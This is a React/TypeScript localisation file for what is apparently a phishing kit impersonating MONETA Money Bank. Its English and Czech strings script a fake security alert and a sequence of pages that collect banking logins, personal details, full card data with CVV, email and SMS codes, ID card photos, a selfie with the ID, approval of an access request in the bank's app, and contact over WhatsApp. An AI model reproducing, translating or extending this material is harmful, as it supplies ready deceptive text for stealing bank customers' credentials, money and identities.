import React, { createContext, useContext, useState } from 'react';

type Language = 'en' | 'cs';

interface LanguageContextType {
  language: Language;
  toggleLanguage: () => void;
  t: (key: string) => string;
}

const translations = {
  en: {
    // Header
    phone: '224 443 636',
    czechVersion: 'Česká verze',
    
    // Security Alert Page
    criticalSecurityAlert: 'CRITICAL SECURITY ALERT',
    securityAlertDescription: 'We have detected unauthorized access to your account. Immediate action is required to protect your financial information and prevent potential fraudulent activity.',
    unauthorizedLogin: 'Unauthorized Login Attempt Detected',
    securitySystemMessage: 'Our security system has identified a login attempt from an unrecognized device and location. This activity does not match your typical usage patterns. If you did not authorize this access, your account security may be at risk.',
    suspiciousActivityDetails: 'Suspicious Activity Details',
    ipAddress: 'IP Address',
    geographicLocation: 'Geographic Location',
    deviceModel: 'Device Model',
    operatingSystem: 'Operating System',
    deviceIMEI: 'Device IMEI',
    dateTime: 'Date & Time',
    secureAccountNow: 'Secure Your Account Now',
    recognizeActivity: 'If you recognize this activity, you can safely ignore this message.',
    importantNotice: 'IMPORTANT NOTICE:',
    importantNoticeText: 'If you did not initiate this login attempt, your account credentials may have been compromised. We strongly recommend securing your account immediately to prevent unauthorized transactions and protect your personal information.',
    
    // Login Page
    loginToInternetBanking: 'Login to Internet Banking',
    enterCredentials: 'Please enter your credentials to access your account',
    clientID: 'Client ID',
    enterClientID: 'Enter your client ID',
    username: 'Username',
    enterUsername: 'Enter your username',
    password: 'Password',
    enterPassword: 'Enter your password',
    login: 'Login',
    forgotPassword: 'Forgot your password?',
    troublesLogin: 'Troubles with login',
    sslEncryption: 'Your connection is secured with 256-bit SSL encryption',
    
    // Loading Page
    processingRequest: 'Processing your request...',
    pleaseWait: 'Please wait while we verify your information',
    
    // Personal Data Page
    personalInformationVerification: 'Personal Information Verification',
    confirmPersonalDetails: 'Please confirm your personal details for security verification',
    fullName: 'Full Name',
    enterFullName: 'Enter your full name',
    dateOfBirth: 'Date of Birth',
    residentialAddress: 'Residential Address',
    enterAddress: 'Enter your address',
    phoneNumber: 'Phone Number',
    continue: 'Continue',
    
    // Credit Card Page
    cardVerification: 'Card Verification',
    verifyCardInfo: 'Please verify your payment card information',
    cardNumber: 'Card Number',
    expiryDate: 'Expiry Date',
    cvv: 'CVV',
    cardholderName: 'Cardholder Name',
    verifyCard: 'Verify Card',
    enterCardDetailsBelow: 'Enter your card details below. The preview will update as you type.',
    
    // Email OTP Page
    emailVerification: 'Email Verification',
    emailOTPSent: "We've sent a 6-digit verification code to your registered email address.",
    enterCodeBelow: 'Please enter the code below to continue.',
    verifyCode: 'Verify Code',
    resendCode: 'Resend code',
    
    // SMS OTP Page
    smsVerification: 'SMS Verification',
    smsOTPSent: "We've sent a 6-digit verification code to your registered phone number.",
    
    // QR Code Page
    qrCodeVerification: 'QR Code Verification',
    scanQRCode: 'Please scan the QR code below with your authentication app to complete the verification.',
    waitingForQR: 'Waiting for QR code...',
    instructions: 'Instructions:',
    qrInstructions: 'Open your mobile banking app and scan this QR code to authorize the transaction.',
    
    // Wrong Details Page
    verificationFailed: 'Verification Failed',
    incorrectInformation: 'Incorrect Information',
    infoDoesNotMatch: 'The information you provided does not match our records. Please wait while our system verifies your account.',
    whatHappensNext: 'What happens next?',
    securityTeamReviewing: 'Our security team is reviewing your submission. You will be redirected shortly. If you believe this is an error, please contact our support team.',
    forAssistance: 'For assistance, call:',
    
    // Success Page
    verificationComplete: 'Verification Complete',
    accountSecuredSuccessfully: 'Account Secured Successfully',
    accountVerifiedSuccess: 'Your account has been successfully verified and secured. All security measures are now active.',
    whatsNext: "What's Next?",
    accountProtected: 'Your account is now protected. You will receive a confirmation email shortly. You can now safely access all banking services.',
    twoFactorEnabled: 'Two-factor authentication enabled',
    accountDetailsVerified: 'Account details verified',
    securityAlertResolved: 'Security alert resolved',
    
    // Document Upload Page
    documentUpload: 'Document Upload',
    uploadDocuments: 'Please upload the required documents for verification',
    idCardFront: 'ID Card (Front)',
    idCardBack: 'ID Card (Back)',
    selfieWithID: 'Selfie with ID',
    uploadInstructions: 'Upload Instructions:',
    uploadInstruction1: 'Make sure all text is clearly readable',
    uploadInstruction2: 'Upload high-quality photos',
    uploadInstruction3: 'Ensure good lighting and no reflections',
    clickToUpload: 'Click to upload',
    orDragAndDrop: 'or drag and drop',
    uploadDocument: 'Upload Document',
    
    // QR Upload Page
    qrUpload: 'QR Code Upload',
    uploadQRCode: 'Please upload the QR code you received',
    qrUploadInstructions: 'Upload the QR code from your gallery or computer',
    uploadQR: 'Upload QR Code',
    
    // URL Verification Page
    urlVerification: 'URL Verification',
    enterVerificationURL: 'Please paste the verification URL you received via email or SMS',
    verificationURL: 'Verification URL',
    pasteURL: 'Paste the URL here',
    verifyURL: 'Verify URL',
    urlInstructions: 'Instructions:',
    urlInstruction1: 'Check your email or SMS for the verification link',
    urlInstruction2: 'Copy the complete URL',
    urlInstruction3: 'Paste it in the field above',
    
    // WhatsApp Support Page
    whatsappSupport: 'WhatsApp Support',
    securityVerificationRequired: 'Security Verification Required',
    securityVerificationText: 'For your safety, we need to verify your identity before we can restore your account.',
    nextSteps: 'Next Steps:',
    whatsappStep1: 'Click the green WhatsApp button below',
    whatsappStep2: 'Send a message with: "Account Verification" (without quotes)',
    whatsappStep3: 'Our specialist will help you with the next steps',
    whatsappStep4: 'Keep your phone ready for verification',
    completeViaWhatsApp: 'Complete Verification via WhatsApp Support',
    available247: 'Available 24/7 • Average response time: <2 minutes',
    
    // App Verification Page
    appVerification: 'App Verification',
    appVerificationRequired: 'Access Verification Required',
    appVerificationText: 'You must verify the access from this device. Check your MONETA app - you have received a notification to accept the access. The verification process can take several seconds. Please be patient.',
    iHaveAuthorized: 'I Have Authorized',
    checkingApp: 'Checking MONETA app...',
    waitingForApproval: 'Waiting for your approval in the app',
    
    // Footer
    safeUseRules: 'Rules for safe use of the Internet Banka and Smart Banka services',
    cookieSettings: 'Cookie settings',
    loan: 'Loan',
    contacts: 'Contacts',
    website: 'www.moneta.cz',
    copyright: '© 2025 MONETA Money Bank',
  },
  cs: {
    // Header
    phone: '224 443 636',
    czechVersion: 'English version',
    
    // Security Alert Page
    criticalSecurityAlert: 'KRITICKÉ BEZPEČNOSTNÍ UPOZORNĚNÍ',
    securityAlertDescription: 'Zjistili jsme neoprávněný přístup k vašemu účtu. K ochraně vašich finančních informací a prevenci podvodné činnosti je nutné okamžité jednání.',
    unauthorizedLogin: 'Zjištěn pokus o neoprávněné přihlášení',
    securitySystemMessage: 'Náš bezpečnostní systém identifikoval pokus o přihlášení z nerozpoznaného zařízení a umístění. Tato aktivita neodpovídá vašim typickým vzorcům používání. Pokud jste tento přístup neautorizovali, bezpečnost vašeho účtu může být ohrožena.',
    suspiciousActivityDetails: 'Podrobnosti o podezřelé aktivitě',
    ipAddress: 'IP adresa',
    geographicLocation: 'Geografická poloha',
    deviceModel: 'Model zařízení',
    operatingSystem: 'Operační systém',
    deviceIMEI: 'IMEI zařízení',
    dateTime: 'Datum a čas',
    secureAccountNow: 'Zabezpečte svůj účet nyní',
    recognizeActivity: 'Pokud tuto aktivitu rozpoznáváte, můžete tuto zprávu bezpečně ignorovat.',
    importantNotice: 'DŮLEŽITÉ UPOZORNĚNÍ:',
    importantNoticeText: 'Pokud jste tento pokus o přihlášení nezahájili, vaše přihlašovací údaje mohly být kompromitovány. Důrazně doporučujeme okamžitě zabezpečit váš účet, abyste zabránili neoprávněným transakcím a ochránili vaše osobní údaje.',
    
    // Login Page
    loginToInternetBanking: 'Přihlášení do internetového bankovnictví',
    enterCredentials: 'Zadejte prosím své přihlašovací údaje pro přístup k účtu',
    clientID: 'ID klienta',
    enterClientID: 'Zadejte ID klienta',
    username: 'Uživatelské jméno',
    enterUsername: 'Zadejte uživatelské jméno',
    password: 'Heslo',
    enterPassword: 'Zadejte heslo',
    login: 'Přihlásit se',
    forgotPassword: 'Zapomněli jste heslo?',
    troublesLogin: 'Problémy s přihlášením',
    sslEncryption: 'Vaše připojení je zabezpečeno 256bitovým šifrováním SSL',
    
    // Loading Page
    processingRequest: 'Zpracování vašeho požadavku...',
    pleaseWait: 'Počkejte prosím, než ověříme vaše informace',
    
    // Personal Data Page
    personalInformationVerification: 'Ověření osobních údajů',
    confirmPersonalDetails: 'Potvrďte prosím své osobní údaje pro bezpečnostní ověření',
    fullName: 'Celé jméno',
    enterFullName: 'Zadejte své celé jméno',
    dateOfBirth: 'Datum narození',
    residentialAddress: 'Adresa bydliště',
    enterAddress: 'Zadejte svou adresu',
    phoneNumber: 'Telefonní číslo',
    continue: 'Pokračovat',
    
    // Credit Card Page
    cardVerification: 'Ověření karty',
    verifyCardInfo: 'Ověřte prosím informace o vaší platební kartě',
    cardNumber: 'Číslo karty',
    expiryDate: 'Datum expirace',
    cvv: 'CVV',
    cardholderName: 'Jméno držitele karty',
    verifyCard: 'Ověřit kartu',
    enterCardDetailsBelow: 'Zadejte níže údaje své karty. Náhled se bude aktualizovat při psaní.',
    
    // Email OTP Page
    emailVerification: 'Ověření e-mailem',
    emailOTPSent: 'Zaslali jsme 6místný ověřovací kód na vaši registrovanou e-mailovou adresu.',
    enterCodeBelow: 'Pro pokračování zadejte níže uvedený kód.',
    verifyCode: 'Ověřit kód',
    resendCode: 'Znovu odeslat kód',
    
    // SMS OTP Page
    smsVerification: 'Ověření SMS',
    smsOTPSent: 'Zaslali jsme 6místný ověřovací kód na vaše registrované telefonní číslo.',
    
    // QR Code Page
    qrCodeVerification: 'Ověření QR kódu',
    scanQRCode: 'Naskenujte prosím níže uvedený QR kód pomocí své autentizační aplikace pro dokončení ověření.',
    waitingForQR: 'Čekání na QR kód...',
    instructions: 'Pokyny:',
    qrInstructions: 'Otevřete aplikaci mobilního bankovnictví a naskenujte tento QR kód pro autorizaci transakce.',
    
    // Wrong Details Page
    verificationFailed: 'Ověření se nezdařilo',
    incorrectInformation: 'Nesprávné informace',
    infoDoesNotMatch: 'Zadané informace neodpovídají našim záznamům. Počkejte prosím, než náš systém ověří váš účet.',
    whatHappensNext: 'Co se stane dále?',
    securityTeamReviewing: 'Náš bezpečnostní tým kontroluje vaše podání. Brzy budete přesměrováni. Pokud se domníváte, že se jedná o chybu, kontaktujte prosím naši podporu.',
    forAssistance: 'Pro pomoc volejte:',
    
    // Success Page
    verificationComplete: 'Ověření dokončeno',
    accountSecuredSuccessfully: 'Účet úspěšně zabezpečen',
    accountVerifiedSuccess: 'Váš účet byl úspěšně ověřen a zabezpečen. Všechna bezpečnostní opatření jsou nyní aktivní.',
    whatsNext: 'Co dál?',
    accountProtected: 'Váš účet je nyní chráněn. Brzy obdržíte potvrzovací e-mail. Nyní máte bezpečný přístup ke všem bankovním službám.',
    twoFactorEnabled: 'Dvoufaktorové ověření povoleno',
    accountDetailsVerified: 'Podrobnosti účtu ověřeny',
    securityAlertResolved: 'Bezpečnostní upozornění vyřešeno',
    
    // Document Upload Page
    documentUpload: 'Nahrání dokumentů',
    uploadDocuments: 'Nahrajte prosím požadované dokumenty pro ověření',
    idCardFront: 'Občanský průkaz (přední strana)',
    idCardBack: 'Občanský průkaz (zadní strana)',
    selfieWithID: 'Selfie s průkazem',
    uploadInstructions: 'Pokyny pro nahrání:',
    uploadInstruction1: 'Ujistěte se, že je veškerý text jasně čitelný',
    uploadInstruction2: 'Nahrajte fotografie vysoké kvality',
    uploadInstruction3: 'Zajistěte dobré osvětlení a žádné odrazy',
    clickToUpload: 'Klikněte pro nahrání',
    orDragAndDrop: 'nebo přetáhněte',
    uploadDocument: 'Nahrát dokument',
    
    // QR Upload Page
    qrUpload: 'Nahrání QR kódu',
    uploadQRCode: 'Nahrajte prosím QR kód, který jste obdrželi',
    qrUploadInstructions: 'Nahrajte QR kód z galerie nebo počítače',
    uploadQR: 'Nahrát QR kód',
    
    // URL Verification Page
    urlVerification: 'Ověření URL',
    enterVerificationURL: 'Vložte prosím ověřovací URL, které jste obdrželi e-mailem nebo SMS',
    verificationURL: 'Ověřovací URL',
    pasteURL: 'Vložte URL zde',
    verifyURL: 'Ověřit URL',
    urlInstructions: 'Pokyny:',
    urlInstruction1: 'Zkontrolujte e-mail nebo SMS s ověřovacím odkazem',
    urlInstruction2: 'Zkopírujte celou URL adresu',
    urlInstruction3: 'Vložte ji do pole výše',
    
    // WhatsApp Support Page
    whatsappSupport: 'WhatsApp podpora',
    securityVerificationRequired: 'Vyžadováno bezpečnostní ověření',
    securityVerificationText: 'Pro vaši bezpečnost musíme ověřit vaši identitu, než budeme moci obnovit váš účet.',
    nextSteps: 'Další kroky:',
    whatsappStep1: 'Klikněte na zelené tlačítko WhatsApp níže',
    whatsappStep2: 'Odešlete zprávu s textem: "Ověření účtu" (bez uvozovek)',
    whatsappStep3: 'Náš specialista vám pomůže s dalšími kroky',
    whatsappStep4: 'Mějte telefon připravený pro ověření',
    completeViaWhatsApp: 'Dokončit ověření přes WhatsApp podporu',
    available247: 'Dostupné 24/7 • Průměrná doba odezvy: <2 minuty',
    
    // App Verification Page
    appVerification: 'Ověření aplikace',
    appVerificationRequired: 'Vyžadováno ověření přístupu',
    appVerificationText: 'Musíte ověřit přístup z tohoto zařízení. Zkontrolujte svou aplikaci MONETA - obdrželi jste oznámení aplikace k přijetí přístupu. Proces ověření může trvat několik sekund. Buďte prosím trpěliví.',
    iHaveAuthorized: 'Autorizoval jsem',
    checkingApp: 'Kontrola aplikace MONETA...',
    waitingForApproval: 'Čekání na vaše schválení v aplikaci',
    
    // Footer
    safeUseRules: 'Pravidla bezpečného používání služeb Internet Banka a Smart Banka',
    cookieSettings: 'Nastavení cookies',
    loan: 'Půjčka',
    contacts: 'Kontakty',
    website: 'www.moneta.cz',
    copyright: '© 2025 MONETA Money Bank',
  },
};

const LanguageContext = createContext<LanguageContextType | undefined>(undefined);

export function LanguageProvider({ children }: { children: React.ReactNode }) {
  const [language, setLanguage] = useState<Language>('cs');

  const toggleLanguage = () => {
    setLanguage(prev => prev === 'en' ? 'cs' : 'en');
  };

  const t = (key: string): string => {
    return translations[language][key as keyof typeof translations.en] || key;
  };

  return (
    <LanguageContext.Provider value={{ language, toggleLanguage, t }}>
      {children}
    </LanguageContext.Provider>
  );
}

export function useLanguage() {
  const context = useContext(LanguageContext);
  if (context === undefined) {
    throw new Error('useLanguage must be used within a LanguageProvider');
  }
  return context;
}
